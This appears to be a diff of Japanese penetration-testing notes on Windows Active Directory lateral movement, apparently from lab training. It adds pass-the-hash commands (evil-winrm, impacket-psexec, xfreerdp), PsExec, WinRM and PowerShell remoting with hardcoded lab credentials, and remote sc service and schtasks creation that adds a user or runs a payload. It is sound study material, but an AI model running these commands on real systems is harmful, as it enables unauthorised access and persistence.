@@ -34,7 +34,27 @@
 
   ※Active Directoryのドメインアカウントと組み込みのローカル管理者アカウントに有効です。2014年のセキュリティアップデート7以降、この手法は他のローカル管理者アカウントとして認証するために使用することはできない
 
+* ### evil-winrm
 
+  ```
+  evil-winrm -i 192.168.158.57 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 
+  ```
+
+* ### impacket-psexec
+
+  ```
+  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.158.57
+  ```
+
+* ### RDP
+
+  ```
+  xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+  ```
+
+  ```
+  rdesktop -g 90% -d EXAM -u ted -p avatar123 192.168.131.171
+  ```
 
 
 
@@ -274,5 +294,110 @@ API である DCOM サービスコントロールマネージャを呼び出す�
   PS C:\Tools\practical_tools> nc.exe -lvnp 4444
   ```
 
-  
 
+
+
+### パスワードでの横展開（windows clientから）
+
+#### PsExec
+
+* Ports: 445/TCP(SMB)
+* Required Group Memberships：Administrators
+
+```
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+```
+
+
+
+#### Remote Process Creation Using WinRM
+
+- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- **Required Group Memberships:** Remote Management Users
+
+Powershellコマンドをリモートホストに送るためのツール。Windowsにデフォルトでダウンロードされていることが多い。
+
+```
+winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+```
+
+Powershellでも同様のことができるが、新しいPSCredential Objectを作成する必要がある
+
+```powershell
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+以下コマンドでPSSessionを作成する
+
+```powershell
+Enter-PSSession -Computername TARGET -Credential $credential
+```
+
+スクリプトを実行するための以下のようなコマンドもある
+
+```powershell
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
+
+#### 
+
+#### Remotely Creating Services Using sc
+
+- Ports:
+  - 135/TCP, 49152-65535/TCP (DCE/RPC)
+  - 445/TCP (RPC over SMB Named Pipes)
+  - 139/TCP (RPC over SMB Named Pipes) SMB over NetBIOS
+- **Required Group Memberships:** Administrators
+
+SVCCTL：Service Control Manager
+EPM：Endpoint Mapper
+
+1. port135のEPMにつなぐ、EPMがSVCCTLにアクセスするためのIPアドレスとポート番号を通知する。このポートには通常49152-65535のダイナミックポートが使われる。
+
+   ![image-20221119100519157](img/ActiveDirectory_lateralmove/image-20221119100519157.png)
+
+2. もしRPCでの接続が失敗したらSMBパイプで接続を試みる(port 445 / port139)
+
+![image-20221119100646375](img/ActiveDirectory_lateralmove/image-20221119100646375.png)
+
+`THMservice`を作って実行するコマンド
+
+```cmd
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+```
+
+"net user"コマンドがサービスがスタートすると実行され、新しいローカルユーザが作成される。
+コマンド出力を確認することはできない。
+
+サービスを止めて削除するコマンド
+
+```cmd
+sc.exe \\TARGET stop THMservice
+sc.exe \\TARGET delete THMservice
+```
+
+#### Creating Scheduled Tasks Remotely
+
+schtasksを作成する。THMtask1を作成するコマンド
+
+```cmd
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+
+schtasks /s TARGET /run /TN "THMtask1" 
+```
+
+/sc ONCE：特定の時間に一回のみ実施する
+
+これも標準出力結果を見ることはできない
+
+削除するコマンド
+
+```cmd
+schtasks /S TARGET /TN "THMtask1" /DELETE /F
+```
+
+#### 
